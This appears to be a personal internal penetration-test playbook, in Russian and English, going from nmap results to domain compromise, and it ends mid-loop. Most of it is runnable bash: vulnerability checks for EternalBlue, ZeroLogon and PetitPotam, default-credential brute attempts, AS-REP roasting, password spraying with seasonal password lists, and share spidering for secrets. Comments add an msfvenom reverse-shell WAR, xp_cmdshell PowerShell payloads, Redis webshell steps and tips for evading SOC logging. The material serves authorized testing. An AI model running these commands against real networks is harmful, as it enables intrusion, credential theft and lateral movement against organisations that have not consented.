---
id: "ohwav5y0nmn5puoqh"
title: "after_nmap_top100"
tags: []
isFavorite: false
order: "4"
createdAt: "2026-03-25T07:22:36.857Z"
updatedAt: "2026-03-25T07:25:02.382Z"
---
INTERNAL PENTEST PLAYBOOK: POST-NMAP ANALYSIS → DA
PHASE 1: АНАЛИЗ NMAP РЕЗУЛЬТАТОВ (первые 5 минут)
1.1. Быстрый парсинг — выделяем главное
Bash

# Сохраняем переменные для удобства
NMAP_FILE="new_project_top100"

# Все живые хосты с открытыми портами
grep "open" ${NMAP_FILE}.gnmap | awk '{print $2}' | sort -u > nmap_alive.txt

# Быстрая сводка: какие порты на каких хостах
grep -oP '\d+/open/tcp//[^/]+' ${NMAP_FILE}.gnmap | sort | uniq -c | sort -rn | head -30
# → покажет самые распространённые сервисы в сети

# OS detection summary
grep "OS:" ${NMAP_FILE}.gnmap | sort -u

# Все сервисы с версиями (для поиска уязвимых)
grep -E "open" ${NMAP_FILE}.nmap | grep -v "filtered" | sort -u > all_services.txt
1.2. На что смотреть В ПЕРВУЮ ОЧЕРЕДЬ (порядок приоритета)
text

ПРИОРИТЕТ 1 — INSTANT WIN (смотрим первым делом):
─────────────────────────────────────────────────
[!] Старые ОС: Windows 2008, 2003, XP, 7 → MS17-010 / EternalBlue
[!] MSSQL (1433) с sa:sa или sa:'' 
[!] FTP anonymous (21)
[!] NFS shares (111/2049) — монтируем без кредов
[!] Telnet (23) — legacy, часто без пароля или admin:admin
[!] IPMI (623/udp) — cipher zero, hash dump
[!] Принтеры / iLO / iDRAC — дефолтные креды
[!] Jenkins / Tomcat / JBoss без аутентификации
[!] SMB signing disabled + LLMNR/NBNS → relay

ПРИОРИТЕТ 2 — QUICK WINS С МИНИМАЛЬНЫМИ УСИЛИЯМИ:
──────────────────────────────────────────────────
[*] Kerberos (88) → DC identified → AS-REP roast
[*] LDAP (389/636) anonymous bind
[*] SMB null/guest sessions → enum users, shares
[*] RDP (3389) → NLA disabled? bluekeep?
[*] WinRM (5985/5986) → проверяем после получения кредов
[*] Web services → default creds, known CVE

ПРИОРИТЕТ 3 — ТРЕБУЮТ КРЕДОВ ИЛИ ВРЕМЕНИ:
───────────────────────────────────────────
[·] Kerberoasting (нужны креды)
[·] BloodHound (нужны креды)
[·] ADCS (нужны креды)
[·] Password spray (нужен список юзеров)
[·] Lateral movement
1.3. Быстрый парсинг по категориям
Bash

# === DC / AD Infrastructure ===
grep -E "88/open|389/open|636/open|53/open" ${NMAP_FILE}.gnmap | awk '{print $2}' | sort -u > confirmed_dcs.txt
echo "[*] Domain Controllers:"
cat confirmed_dcs.txt

# === Windows hosts (по портам и OS detection) ===
grep -iE "windows|microsoft" ${NMAP_FILE}.nmap | grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u > windows_hosts.txt

# === Legacy / Vulnerable OS ===
grep -iE "windows.*(2003|2008|xp|vista|7 )" ${NMAP_FILE}.nmap | grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u > legacy_windows.txt
echo "[!!!] Legacy Windows (likely vulnerable):"
cat legacy_windows.txt

# === Linux hosts ===
grep -iE "linux|ubuntu|centos|debian" ${NMAP_FILE}.nmap | grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u > linux_hosts.txt

# === Хосты с максимальным количеством открытых портов (самые "жирные") ===
grep "open" ${NMAP_FILE}.gnmap | awk '{print $2, gsub(/open/,"")}' | sort -t' ' -k2 -rn | head -20 > fattest_hosts.txt
echo "[*] Most exposed hosts:"
cat fattest_hosts.txt

# === Нестандартные порты (часто самое интересное) ===
grep -oP '\d+/open' ${NMAP_FILE}.gnmap | cut -d/ -f1 | sort -un | while read port; do
    count=$(grep -c "$port/open" ${NMAP_FILE}.gnmap)
    if [ "$count" -le 3 ] && [ "$port" -gt 1024 ]; then
        echo "[RARE] Port $port open on $count hosts"
    fi
done | tee rare_ports.txt
1.4. Паттерны которые ищем глазами в nmap output
Bash

# Пароли / креды в баннерах
grep -iE "password|credential|anonymous|default|unauthorized" ${NMAP_FILE}.nmap

# Конкретные продукты с известными CVE
grep -iE "apache 2\.[24]\.|iis [67]\.|tomcat [5-8]\.|weblogic|jboss|jenkins|gitlab|exchange|sharepoint|citrix|pulse|fortinet|f5|vcenter|esxi|solarwinds|zabbix|nagios|grafana|kibana|elastic|splunk|confluence|jira|bitbucket|nexus|sonarqube|artifactory" ${NMAP_FILE}.nmap | tee known_products.txt

# SMB версии (для подбора эксплойтов)
grep -iE "smb|microsoft-ds|netbios" ${NMAP_FILE}.nmap

# SSL/TLS info (для определения продуктов)
grep -iE "ssl-cert|commonName|organizationName" ${NMAP_FILE}.nmap | sort -u

# Hostname leak через сертификаты и NetBIOS
grep -iE "commonName=|NetBIOS|DNS:" ${NMAP_FILE}.nmap | sort -u > hostnames.txt
PHASE 2: ДЕЙСТВИЯ СРАЗУ ПОСЛЕ NMAP (следующие 15-30 минут)
2.1. Дерево принятия решений
text

nmap результаты получены
│
├─► Legacy Windows найден? (2003/2008/XP/7)
│   └─► ДА → НЕМЕДЛЕННО проверяй MS17-010 → shell → SAM → lateral
│
├─► SMB signing disabled на хостах?
│   └─► ДА → Responder уже ловит → ntlmrelayx уже крутится → жди auth
│
├─► Null session / Guest на SMB?
│   └─► ДА → enum users → AS-REP roast → password spray
│
├─► LDAP anonymous bind?
│   └─► ДА → dump всех юзеров → ищи пароли в description → AS-REP → spray
│
├─► Web-сервисы нашлись?
│   └─► ДА → скриншоты → ищи Jenkins/Tomcat/известные продукты → default creds
│
├─► MSSQL найден?
│   └─► ДА → sa:sa, sa:'', sa:Password1 → xp_cmdshell → shell
│
├─► FTP anonymous?
│   └─► ДА → смотри содержимое → конфиги, скрипты с паролями
│
├─► NFS (111/2049)?
│   └─► ДА → showmount → mount → ищи SSH keys, конфиги, .bash_history
│
└─► Ничего из вышеперечисленного?
    └─► Упор на Responder/mitm6 relay + kerbrute enum + spray
2.2. Приоритизированные атаки (запускаем параллельно)
Волна 1 — Первые 5 минут после nmap (параллельно):

Bash

# 1. Legacy Windows — EternalBlue
if [ -s legacy_windows.txt ]; then
    echo "[!!!] LEGACY WINDOWS FOUND — checking MS17-010"
    netexec smb legacy_windows.txt -M ms17-010 2>&1 | tee ms17010_results.txt
    grep -i "VULNERABLE" ms17010_results.txt
    # Если vulnerable:
    # msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $(cat legacy_windows.txt | head -1); set LHOST YOUR_IP; run"
fi

# 2. NFS shares (часто забывают, а там бывает /home, /etc, backup)
if [ -s nfs_hosts.txt ] || grep -q "111/open\|2049/open" ${NMAP_FILE}.gnmap; then
    grep -E "111/open|2049/open" ${NMAP_FILE}.gnmap | awk '{print $2}' | sort -u > nfs_hosts.txt
    for ip in $(cat nfs_hosts.txt); do
        echo "=== NFS on $ip ==="
        showmount -e $ip 2>&1
    done | tee nfs_exports.txt
    # Если нашли экспорт:
    # mkdir -p /tmp/nfs_mount
    # mount -t nfs $ip:/export /tmp/nfs_mount -o nolock
    # find /tmp/nfs_mount -name "*.conf" -o -name "*.config" -o -name "*.xml" -o -name "*.ini" \
    #   -o -name "*.sh" -o -name "*.ps1" -o -name "*.bat" -o -name "id_rsa" -o -name "*.kdbx" \
    #   -o -name ".bash_history" -o -name "*.pgpass" -o -name "*.my.cnf" 2>/dev/null
fi

# 3. MSSQL quick check
if [ -s db_hosts.txt ]; then
    echo "[*] Checking MSSQL default creds"
    netexec mssql db_hosts.txt -u sa -p '' 2>&1 | tee mssql_blank.txt
    netexec mssql db_hosts.txt -u sa -p 'sa' 2>&1 | tee -a mssql_blank.txt
    netexec mssql db_hosts.txt -u sa -p 'Password1' 2>&1 | tee -a mssql_blank.txt
    netexec mssql db_hosts.txt -u sa -p 'P@ssw0rd' 2>&1 | tee -a mssql_blank.txt
    netexec mssql db_hosts.txt -u sa -p 'sa123' 2>&1 | tee -a mssql_blank.txt
    grep "+" mssql_blank.txt
fi

# 4. FTP anonymous
if [ -s ftp_hosts.txt ]; then
    for ip in $(cat ftp_hosts.txt); do
        echo "=== FTP $ip ==="
        timeout 10 ftp -n $ip <<EOF 2>&1
user anonymous anonymous@
ls -la
bye
EOF
    done | tee ftp_anon_results.txt
fi

# 5. Telnet — дефолтные / пустые креды
grep "23/open" ${NMAP_FILE}.gnmap | awk '{print $2}' | sort -u > telnet_hosts.txt
if [ -s telnet_hosts.txt ]; then
    for ip in $(cat telnet_hosts.txt); do
        echo "=== Telnet $ip ==="
        timeout 5 bash -c "echo '' | telnet $ip 2>&1" | head -10
    done | tee telnet_banners.txt
fi
Волна 2 — Следующие 10 минут:

Bash

# 6. ZeroLogon (если ещё не проверяли)
for dc in $(cat confirmed_dcs.txt); do
    netexec smb $dc -M zerologon 2>&1
done | tee zerologon_results.txt

# 7. PetitPotam без кредов
for dc in $(cat confirmed_dcs.txt); do
    netexec smb $dc -M petitpotam 2>&1
done | tee petitpotam_results.txt

# 8. Coerce attacks
netexec smb smb_hosts.txt -M coerce_plus 2>&1 | tee coerce_results.txt

# 9. WebDAV (для relay через HTTP)
netexec smb smb_hosts.txt -M webdav 2>&1 | tee webdav_results.txt

# 10. IPMI
masscan -iL scope.txt -pU:623 --rate 3000 -oL ipmi_scan.txt 2>/dev/null
grep "^open" ipmi_scan.txt | awk '{print $4}' > ipmi_hosts.txt
if [ -s ipmi_hosts.txt ]; then
    for ip in $(cat ipmi_hosts.txt); do
        echo "=== IPMI $ip ==="
        # Cipher zero vulnerability
        ipmitool -I lanplus -H $ip -U admin -P admin -C 0 user list 2>&1
        # RAKP hash retrieval (MSF)
        # use auxiliary/scanner/ipmi/ipmi_dumphashes
    done | tee ipmi_results.txt
fi
2.3. Связка masscan + nmap + AD разведка
Bash

# Сверяем данные: masscan мог пропустить (UDP, rate too high)
# nmap мог не покрыть (top-100 не включает все порты)

# Хосты, которые masscan нашёл, а nmap нет
comm -23 <(sort live_hosts.txt) <(sort nmap_alive.txt) > missed_by_nmap.txt
if [ -s missed_by_nmap.txt ]; then
    echo "[!] Hosts found by masscan but missed by nmap:"
    cat missed_by_nmap.txt
    # Досканиваем их
    nmap -iL missed_by_nmap.txt --top-ports 100 -sV -Pn -T4 -oA missed_hosts_scan
fi

# Объединяем всё в master inventory
echo "=== NETWORK INVENTORY ===" > inventory.txt
echo "" >> inventory.txt
echo "Domain: $DOMAIN" >> inventory.txt
echo "DC IPs: $(cat confirmed_dcs.txt | tr '\n' ', ')" >> inventory.txt
echo "Total alive hosts: $(cat live_hosts.txt | wc -l)" >> inventory.txt
echo "SMB hosts: $(cat smb_hosts.txt | wc -l)" >> inventory.txt
echo "Web hosts: $(cat web_hosts.txt | wc -l)" >> inventory.txt
echo "DB hosts: $(cat db_hosts.txt | wc -l)" >> inventory.txt
echo "Legacy Windows: $(cat legacy_windows.txt 2>/dev/null | wc -l)" >> inventory.txt
echo "Relay targets (no SMB signing): $(cat relay_targets.txt 2>/dev/null | wc -l)" >> inventory.txt
cat inventory.txt
PHASE 3: РАЗБИВКА ПО СЕРВИСАМ — ДЕТАЛЬНЫЙ PLAYBOOK
3.1. SMB / AD / LDAP / KERBEROS
text

ЦЕЛЬ: получить список юзеров → AS-REP → spray → Kerberoast → DA
Это основной вектор в 80% внутренних пентестов.
Шаг A: Определяем AD-инфраструктуру
Bash

# Все DC (порт 88 = Kerberos = гарантированно DC)
DC_IP=$(head -1 confirmed_dcs.txt)

# Получаем точное имя домена
netexec smb $DC_IP 2>&1 | tee dc_info.txt
# Вывод: SMB  10.10.10.1  445  DC01  [*] Windows Server 2019 ... (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)

DOMAIN=$(grep "domain:" dc_info.txt | grep -oP 'domain:\K[^)]+')
DC_HOSTNAME=$(grep "name:" dc_info.txt | grep -oP 'name:\K[^)]+')

# Все DC в домене
netexec smb confirmed_dcs.txt 2>&1 | tee all_dcs_info.txt

# DNS zone transfer (иногда работает)
dig @$DC_IP $DOMAIN axfr 2>&1 | tee dns_zone_transfer.txt
# Если работает — золотая жила: все hostnames, все IP
Шаг B: Enum пользователей (без кредов)
Bash

# === Метод 1: RID Brute (самый надёжный без кредов) ===
netexec smb $DC_IP -u '' -p '' --rid-brute 10000 2>&1 | tee rid_brute_null.txt
netexec smb $DC_IP -u 'guest' -p '' --rid-brute 10000 2>&1 | tee rid_brute_guest.txt
# Иногда null session не работает, а guest — работает

# Парсим
cat rid_brute_null.txt rid_brute_guest.txt | grep "SidTypeUser" | \
    awk -F'\\\\' '{print $2}' | awk '{print $1}' | sort -u > domain_users.txt

# === Метод 2: LDAP anonymous ===
BASE_DN="DC=$(echo $DOMAIN | sed 's/\./,DC=/g')"
ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" "(objectClass=user)" sAMAccountName 2>&1 | \
    grep "sAMAccountName:" | awk '{print $2}' | sort -u >> domain_users.txt
sort -u -o domain_users.txt domain_users.txt

# === Метод 3: Kerbrute enum (если методы 1-2 не дали результатов) ===
# Готовим список для перебора (имена из AD чаще всего формат: j.doe, jdoe, john.doe)
# Используем статический список + генерируем по шаблону
# Скачай заранее: https://github.com/insidetrust/statistically-likely-usernames
kerbrute userenum --dc $DC_IP -d $DOMAIN \
    /opt/statistically-likely-usernames/jsmith.txt -o kerbrute_enum.txt 2>&1 &
kerbrute userenum --dc $DC_IP -d $DOMAIN \
    /opt/statistically-likely-usernames/john.smith.txt -o kerbrute_enum2.txt 2>&1 &

# Парсим
cat kerbrute_enum.txt kerbrute_enum2.txt 2>/dev/null | \
    grep "VALID" | awk '{print $NF}' | sed 's/@.*//' | sort -u >> domain_users.txt
sort -u -o domain_users.txt domain_users.txt

echo "[*] Total domain users found: $(wc -l < domain_users.txt)"

# === Метод 4: rpcclient ===
rpcclient -U "" -N $DC_IP -c "enumdomusers" 2>&1 | \
    grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sort -u >> domain_users.txt
sort -u -o domain_users.txt domain_users.txt

# === Ищем описания с паролями (через rpcclient) ===
rpcclient -U "" -N $DC_IP -c "querydispinfo" 2>&1 | tee rpc_dispinfo.txt
grep -iE "pass|pwd|пароль|cred|logon|temp" rpc_dispinfo.txt
На что смотреть в выводе:

text

- Юзеры с "svc" / "service" / "sql" / "backup" / "admin" в имени → высокий приоритет для spray
- Юзеры с description содержащим пароль → мгновенный win
- Machine accounts ($) — не включаем в spray
- Disabled accounts — не включаем в spray (Kerberos покажет)
- Юзеры типа "test", "temp", "new" → слабые пароли
Шаг C: AS-REP Roasting
Bash

# Проверяем ВСЕХ найденных юзеров на DONT_REQUIRE_PREAUTH
impacket-GetNPUsers "$DOMAIN/" -dc-ip $DC_IP \
    -usersfile domain_users.txt -format hashcat \
    -outputfile asrep_hashes.txt 2>&1 | tee asrep_output.txt

# Проверяем результат
if [ -s asrep_hashes.txt ]; then
    echo "[!!!] AS-REP HASHES FOUND!"
    cat asrep_hashes.txt
    # Крутим сразу
    hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule --force -O
fi
Шаг D: Password Spray
Bash

# ОБЯЗАТЕЛЬНО сначала проверяем password policy
netexec smb $DC_IP -u '' -p '' --pass-pol 2>&1 | tee pass_policy.txt
netexec smb $DC_IP -u 'guest' -p '' --pass-pol 2>&1 | tee -a pass_policy.txt

# Если не получается — через LDAP
ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" \
    "(objectClass=domainDNS)" lockoutThreshold lockoutDuration pwdProperties minPwdLength 2>&1

# КРИТИЧНО: смотрим lockoutThreshold
# Если 0 — unlimited, спрей без ограничений
# Если 3 — ОСТОРОЖНО, max 1 попытка за lockout window
# Если 5+ — можно 2-3 попытки с паузой

# === Spray ===
# Правило: 1 пароль за раз, ждём observation window (обычно 30 мин)

# Пароль = username
netexec smb $DC_IP -u domain_users.txt -p domain_users.txt \
    --no-bruteforce --continue-on-success 2>&1 | tee spray_user_eq_pass.txt
grep "[+]" spray_user_eq_pass.txt

# Сезонные и типичные пароли
PASSWORDS=(
    "Password1"
    "Password123"
    "Welcome1"
    "Welcome123"
    "${DOMAIN%%.*}2024"
    "${DOMAIN%%.*}2023"
    "${DOMAIN%%.*}123"
    "Qwerty123"
    "P@ssw0rd"
    "Changeme1"
    "Summer2024"
    "Winter2024"
    "Spring2024"
    "Autumn2024"
    "Company123"  # заменить на реальное название компании
    "Passw0rd"
    "1qaz2wsx"
    "1qaz@WSX"
)

for pass in "${PASSWORDS[@]}"; do
    echo "[*] Spraying: $pass"
    netexec smb $DC_IP -u domain_users.txt -p "$pass" \
        --continue-on-success 2>&1 | grep "[+]" | tee -a spray_results.txt
    # Kerbrute быстрее и не логируется в Windows Event Log (4625)
    kerbrute passwordspray --dc $DC_IP -d $DOMAIN domain_users.txt "$pass" 2>&1 | \
        grep "VALID" | tee -a spray_kerbrute_results.txt
    sleep 1  # пауза между паролями если lockout включён — увеличить до lockoutObservationWindow
done
Частые ошибки новичков при spray:

text

✗ Не проверяют lockout policy → блокируют все аккаунты → провал проекта
✗ Спреят по SMB вместо Kerberos → 4625 event на каждый хост → SOC замечает
✗ Забывают username=password (самый частый quick win)
✗ Не пробуют вариации с названием компании
✗ Спреят по 10 паролей разом без пауз
Шаг E: Null/Guest SMB Shares
Bash

# Подробный анализ шар
netexec smb smb_hosts.txt -u '' -p '' --shares 2>&1 | tee null_shares_all.txt
netexec smb smb_hosts.txt -u 'guest' -p '' --shares 2>&1 | tee guest_shares_all.txt

# Выделяем READ/WRITE
grep -E "READ|WRITE" null_shares_all.txt guest_shares_all.txt | \
    grep -v "IPC\$" | tee accessible_shares.txt

# Spider все доступные шары
netexec smb smb_hosts.txt -u '' -p '' -M spider_plus \
    -o DOWNLOAD_FLAG=false OUTPUT_FOLDER=./spider_null/ 2>&1

netexec smb smb_hosts.txt -u 'guest' -p '' -M spider_plus \
    -o DOWNLOAD_FLAG=false OUTPUT_FOLDER=./spider_guest/ 2>&1

# Ищем интересные файлы в результатах spider
find ./spider_null/ ./spider_guest/ -name "*.json" 2>/dev/null | while read f; do
    python3 -c "
import json,sys
data=json.load(open('$f'))
for share,files in data.items():
    for filepath,info in files.items():
        lower=filepath.lower()
        if any(x in lower for x in ['pass','pwd','cred','secret','config','unattend',
            'sysprep','.kdbx','.vmdk','.vhd','.bak','.sql','.mdb','.accdb',
            'id_rsa','authorized_keys','.pfx','.p12','.key','.pem',
            'web.config','appsettings','connection','.env','.git',
            'ntds','sam','system','security','backup']):
            print(f'[!] {share}/{filepath} ({info.get(\"size\",\"?\")} bytes)')
" 2>/dev/null
done | tee interesting_files.txt

# Ручной заход в подозрительные шары
# smbclient -N //10.10.10.x/ShareName -c "recurse;ls"
# smbclient -N //10.10.10.x/ShareName -c "get path/to/interesting_file.txt"

# SYSVOL / NETLOGON — обязательно проверяем (GPP, скрипты с паролями)
for dc in $(cat confirmed_dcs.txt); do
    echo "=== SYSVOL on $dc ==="
    smbclient -N //$dc/SYSVOL -c "recurse;ls" 2>&1 | \
        grep -iE "\.xml|\.ps1|\.bat|\.vbs|\.cmd|\.ini|\.cfg|Groups\.xml"
    echo "=== NETLOGON on $dc ==="
    smbclient -N //$dc/NETLOGON -c "recurse;ls" 2>&1
done | tee sysvol_netlogon.txt

# Скачиваем ВСЕ скрипты из NETLOGON
for dc in $(cat confirmed_dcs.txt); do
    mkdir -p netlogon_$dc
    smbclient -N //$dc/NETLOGON -c "recurse;prompt off;mget *" --directory=netlogon_$dc 2>&1
done

# Ищем пароли в скриптах
grep -rniE "password|passwd|pwd|credential|secret|net use|runas|/user:" netlogon_*/ 2>/dev/null | tee creds_in_scripts.txt
3.2. RDP / WinRM
Bash

# === RDP ===
# Проверяем NLA (Network Level Authentication)
# Если NLA disabled — можно BlueKeep, можно MitM
nmap -p 3389 -iL rdp_hosts.txt --script rdp-ntlm-info,rdp-enum-encryption -Pn 2>&1 | tee rdp_info.txt

# BlueKeep check
netexec rdp rdp_hosts.txt -M bluekeep 2>&1 | tee bluekeep_results.txt

# RDP screenshot (если хочешь увидеть что на экране)
# ncrack / crowbar для brute (только если policy позволяет)

# Hostname extraction через RDP
grep "Target_Name" rdp_info.txt | sort -u
grep "DNS_Computer_Name" rdp_info.txt | sort -u

# === WinRM ===
# После получения кредов — проверяем WinRM
# WinRM (5985) = shell без записи на диск (нет артефактов на хосте)
# Предпочтительнее psexec/smbexec для stealth

# С кредами:
# evil-winrm -i $TARGET -u $USER -p $PASS
# netexec winrm winrm_hosts.txt -u $USER -p $PASS
На что обращать внимание в RDP-выводе:

text

- DNS_Computer_Name → hostnames для reverse lookup
- Product_Version → версия Windows → CVE matching
- NLA disabled → BlueKeep target (если Server 2008 R2 / Win 7)
- Certificate info → internal hostnames, domain info
3.3. WEB (IIS, Tomcat, Jenkins, etc.)
Bash

# === Массовый скриншотинг ===
# Генерируем URL-лист
cat web_hosts.txt | while read ip; do
    for port in 80 443 8080 8443 8000 8888; do
        if grep -q " $port " masscan_quick.txt | grep -q "$ip"; then
            [ "$port" == "443" -o "$port" == "8443" ] && echo "https://$ip:$port" || echo "http://$ip:$port"
        fi
    done
done > web_urls_full.txt

# Fallback: simple generation
cat web_hosts.txt | while read ip; do
    echo "http://$ip"
    echo "https://$ip"
    echo "http://$ip:8080"
    echo "https://$ip:8443"
done > web_urls_full.txt

# httpx — fingerprinting
httpx -l web_urls_full.txt -title -status-code -tech-detect -content-length \
    -favicon -hash sha256 -jarm -cdn -o httpx_full.txt 2>&1

# Фильтруем интересное
grep -iE "tomcat|jenkins|gitlab|jboss|wildfly|weblogic|exchange|owa|adfs|citrix|pulse|fortinet|f5|vcenter|esxi|phpmyadmin|adminer|wp-login|drupal|joomla|confluence|jira|bitbucket|nexus|sonarqube|grafana|kibana|zabbix|nagios|splunk|guacamole|roundcube|webmin|printer|ilo|idrac|kms|wsus|sccm|adcs|certsrv" httpx_full.txt | tee priority_web.txt

# Скриншоты
gowitness file -f web_urls_full.txt -P ./screenshots/ --timeout 10 2>&1 &

# === Конкретные продукты: атаки ===

# -- Jenkins --
# Если Jenkins без аутентификации → script console → instant RCE
grep -i "jenkins" httpx_full.txt | awk '{print $1}' | while read url; do
    echo "=== Jenkins: $url ==="
    # Проверяем script console
    curl -sk "$url/script" -o /dev/null -w "%{http_code}" 2>&1
    # Проверяем анонимный доступ
    curl -sk "$url/api/json" 2>&1 | head -50
    # Проверяем manage page
    curl -sk "$url/manage" -o /dev/null -w "%{http_code}" 2>&1
    echo ""
done | tee jenkins_check.txt

# Jenkins default creds: admin:admin, admin:password, admin:jenkins
# Script console RCE:
# println "whoami".execute().text

# -- Tomcat --
grep -i "tomcat" httpx_full.txt | awk '{print $1}' | while read url; do
    echo "=== Tomcat: $url ==="
    # Manager default creds
    for cred in "tomcat:tomcat" "admin:admin" "tomcat:s3cret" "admin:tomcat" "admin:" "tomcat:"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        code=$(curl -sk -u "$user:$pass" "$url/manager/html" -o /dev/null -w "%{http_code}" 2>&1)
        echo "  $cred → $code"
    done
done | tee tomcat_check.txt
# Если 200 → WAR deploy → RCE
# msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war -o shell.war

# -- IIS ---
# Проверяем short name scanner (IIS tilde vulnerability)
# java -jar IIS_shortname_scanner.jar <url>
# Ищем web.config, .aspx, .ashx

# -- Exchange / OWA --
grep -iE "exchange|owa|autodiscover" httpx_full.txt | tee exchange_hosts.txt
# ProxyShell / ProxyLogon / ProxyNotShell
# CVE-2021-26855 (ProxyLogon), CVE-2021-34473 (ProxyShell)
# nmap --script http-vuln-cve2021-26855 -p 443 $EXCHANGE_IP

# -- ADCS Web Enrollment --
grep -iE "certsrv|certificate" httpx_full.txt | tee adcs_web.txt
# Если найден → ESC1-ESC11 через certipy (нужны креды)

# -- Default credential check for various products --
# Встроенные модули в nuclei
nuclei -l web_urls_full.txt -t /opt/nuclei-templates/http/default-logins/ \
    -o nuclei_default_creds.txt -silent 2>&1 &

# Общий nuclei scan
nuclei -l web_urls_full.txt -severity critical,high \
    -o nuclei_critical_high.txt -silent 2>&1 &

# -- vCenter --
grep -iE "vcenter|vmware" httpx_full.txt | while read line; do
    url=$(echo "$line" | awk '{print $1}')
    echo "=== vCenter: $url ==="
    # CVE-2021-21972 (RCE без auth)
    curl -sk "$url/ui/vropspluginui/rest/services/uploadova" -X POST -o /dev/null -w "%{http_code}"
    # CVE-2021-22005 (file upload RCE)
    curl -sk "$url/analytics/ceip/sdk/..;/


" -o /dev/null -w "%{http_code}"
done
На что смотреть в web:

text

- 200 на /manager/html, /script, /admin, /console → default creds
- Server header → точная версия → CVE search
- Title: "Index of /" → directory listing → файлы с конфигами
- 401 Unauthorized → brute force
- 403 → bypass techniques (..;/, %2e%2e/, etc.)
- NTLM auth prompt → имя домена и сервера в WWW-Authenticate header
Bash

# Извлекаем NTLM info из web-сервисов с NTLM auth
for url in $(cat web_urls_full.txt); do
    resp=$(curl -sk -I "$url" 2>&1 | grep -i "WWW-Authenticate.*NTLM")
    if [ -n "$resp" ]; then
        echo "[NTLM] $url"
        # nmap script для извлечения домена
        python3 -c "
import requests, base64, struct
from requests_ntlm import HttpNtlmAuth
# Или просто: curl с --ntlm
" 2>/dev/null
    fi
done
3.4. DATABASES (MSSQL, MySQL, PostgreSQL, Redis, MongoDB, Elasticsearch)
Bash

# === MSSQL (1433) ===
# Самый частый quick win через БД на внутреннем пентесте

# Default/weak creds
netexec mssql db_hosts.txt -u sa -p '' 2>&1 | grep "+" | tee mssql_wins.txt
netexec mssql db_hosts.txt -u sa -p 'sa' 2>&1 | grep "+" | tee -a mssql_wins.txt
netexec mssql db_hosts.txt -u sa -p 'Password1' 2>&1 | grep "+" | tee -a mssql_wins.txt
netexec mssql db_hosts.txt -u sa -p 'P@ssw0rd' 2>&1 | grep "+" | tee -a mssql_wins.txt
netexec mssql db_hosts.txt -u sa -p 'sql2019' 2>&1 | grep "+" | tee -a mssql_wins.txt

# Если с доменными кредами:
netexec mssql db_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" -d $DOMAIN 2>&1 | tee mssql_domain.txt
# Windows auth часто работает без пароля sa

# После получения доступа к MSSQL → RCE через xp_cmdshell
# impacket-mssqlclient sa:Password1@$TARGET_IP -windows-auth
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami
# SQL> xp_cmdshell "powershell -e BASE64_PAYLOAD"

# Или linked servers → lateral movement через MSSQL links
# SQL> SELECT * FROM sys.servers;
# SQL> EXEC ('SELECT @@servername') AT [LINKED_SERVER_NAME]

# === MySQL (3306) ===
grep " 3306 " masscan_quick.txt | awk '{print $4}' | sort -u > mysql_hosts.txt
for ip in $(cat mysql_hosts.txt); do
    echo "=== MySQL $ip ==="
    mysql -h $ip -u root --connect-timeout=5 -e "SELECT @@version; SELECT user,host FROM mysql.user;" 2>&1
    mysql -h $ip -u root -p'root' --connect-timeout=5 -e "SELECT @@version;" 2>&1
    mysql -h $ip -u root -p'toor' --connect-timeout=5 -e "SELECT @@version;" 2>&1
    mysql -h $ip -u root -p'password' --connect-timeout=5 -e "SELECT @@version;" 2>&1
done | tee mysql_check.txt

# === PostgreSQL (5432) ===
grep " 5432 " masscan_quick.txt | awk '{print $4}' | sort -u > postgres_hosts.txt
for ip in $(cat postgres_hosts.txt); do
    echo "=== PostgreSQL $ip ==="
    PGPASSWORD='' psql -h $ip -U postgres -c "SELECT version();" 2>&1
    PGPASSWORD='postgres' psql -h $ip -U postgres -c "SELECT version();" 2>&1
    PGPASSWORD='password' psql -h $ip -U postgres -c "SELECT version();" 2>&1
done | tee postgres_check.txt
# PostgreSQL → RCE: COPY ... FROM PROGRAM 'cmd'

# === Redis (6379) ===
for ip in $(grep " 6379 " masscan_quick.txt | awk '{print $4}'); do
    echo "=== Redis $ip ==="
    redis-cli -h $ip INFO server 2>&1 | head -10
    redis-cli -h $ip CONFIG GET dir 2>&1
    redis-cli -h $ip CONFIG GET dbfilename 2>&1
    # Если доступен без пароля → RCE через:
    # 1. SSH key injection (если есть SSH)
    # 2. Webshell через CONFIG SET dir/dbfilename
    # 3. Module load (Redis 4+)
done | tee redis_check.txt

# === MongoDB (27017) ===
for ip in $(grep " 27017 " masscan_quick.txt | awk '{print $4}'); do
    echo "=== MongoDB $ip ==="
    mongosh --host $ip --eval "db.adminCommand('listDatabases')" 2>&1 | head -20
    mongosh --host $ip --eval "db.getCollectionNames()" 2>&1 | head -20
done | tee mongodb_check.txt

# === Elasticsearch (9200) ===
for ip in $(grep " 9200 " masscan_quick.txt | awk '{print $4}'); do
    echo "=== Elasticsearch $ip ==="
    curl -sk "http://$ip:9200/" 2>&1
    curl -sk "http://$ip:9200/_cat/indices?v" 2>&1 | head -30
    # Ищем интересные индексы
    curl -sk "http://$ip:9200/_cat/indices?v" 2>&1 | grep -iE "user|pass|cred|log|auth|session"
done | tee elastic_check.txt
3.5. LEGACY (FTP, Telnet, NFS, SNMP, RPC)
Bash

# === FTP (21) ===
for ip in $(cat ftp_hosts.txt); do
    echo "=== FTP $ip ==="
    # Anonymous login
    curl -s --connect-timeout 5 "ftp://anonymous:anonymous@$ip/" 2>&1 | head -30
    # Writable? (для phishing / payload delivery)
    curl -s -T /tmp/test.txt "ftp://anonymous:anonymous@$ip/test.txt" 2>&1
done | tee ftp_results.txt

# === NFS (111/2049) ===
for ip in $(cat nfs_hosts.txt 2>/dev/null); do
    echo "=== NFS $ip ==="
    showmount -e $ip 2>&1
done | tee nfs_results.txt

# Монтируем доступные exports
grep -oP '\S+\s+\(' nfs_results.txt | while read export; do
    ip=$(echo $export | awk '{print $1}')
